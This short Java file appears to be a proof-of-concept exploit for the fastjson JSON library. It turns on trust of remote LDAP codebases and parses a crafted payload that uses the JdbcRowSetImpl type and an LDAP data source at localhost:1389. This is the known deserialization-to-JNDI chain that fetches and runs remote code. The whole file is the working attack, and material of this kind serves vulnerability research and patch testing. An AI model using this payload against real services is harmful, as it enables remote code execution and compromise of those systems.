package com.example.fastjson220523poc;

import com.alibaba.fastjson.JSON;

public class JNDIV124 {
    public static void main(String[] args) {
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");
        String payload = "{\"rand1\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://localhost:1389/a\",\"autoCommit\":true}}";
        JSON.parse(payload);
    }
}
